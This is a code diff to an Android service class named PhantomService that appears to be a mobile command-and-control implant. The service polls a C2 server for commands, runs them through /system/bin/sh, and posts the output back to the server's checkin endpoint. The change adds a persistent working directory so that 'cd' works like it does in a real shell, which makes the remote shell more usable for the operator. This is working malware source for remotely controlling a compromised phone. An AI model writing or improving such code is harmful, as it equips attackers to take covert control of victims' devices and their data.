@@ -125,6 +125,7 @@ public class PhantomService extends Service {
     private volatile boolean running = true;
     private String agentId = "";
     private String agentName = "";
+    private String cwd = "/";  // persistent working directory across commands
     @Override
     public void onCreate() {
         super.onCreate();
@@ -183,7 +184,29 @@ public class PhantomService extends Service {
                             if (cIdx > 0) {
                                 String sub = resp.substring(cIdx + 11); String cmd = sub.substring(0, sub.indexOf("\""));
                                 Log.i(TAG, "Exec: " + cmd);
-                                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
+                                // Handle cd — update persistent cwd
+                                if (cmd.trim().startsWith("cd ")) {
+                                    String dir = cmd.trim().substring(3).trim();
+                                    java.io.File target;
+                                    if (dir.startsWith("/")) { target = new java.io.File(dir); }
+                                    else { target = new java.io.File(cwd, dir); }
+                                    try { target = target.getCanonicalFile(); } catch (Exception e) {}
+                                    if (target.isDirectory()) {
+                                        cwd = target.getAbsolutePath();
+                                        // Fake output like a real shell
+                                        String cleanOut = "Changed directory to: " + cwd;
+                                        String result = "{\"agent_id\":\"" + agentId + "\",\"results\":[{\"task_id\":\"" + taskId + "\",\"output\":\"" + cleanOut + "\"}]}";
+                                        URL resUrl = new URL(C2 + "/api/v1/mobile/checkin");
+                                        HttpURLConnection rc = (HttpURLConnection) resUrl.openConnection();
+                                        rc.setRequestMethod("POST"); rc.setRequestProperty("Content-Type", "application/json"); rc.setDoOutput(true);
+                                        rc.getOutputStream().write(result.getBytes()); rc.getResponseCode(); rc.disconnect();
+                                        Log.i(TAG, "cd -> " + cwd);
+                                        continue;
+                                    }
+                                }
+                                // Prepend cd to cwd so every command runs in the right directory
+                                String fullCmd = "cd " + cwd + " && " + cmd;
+                                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", fullCmd});
                                 BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                 StringBuilder out = new StringBuilder();
                                 while ((line = pr.readLine()) != null) out.append(line).append("\n");
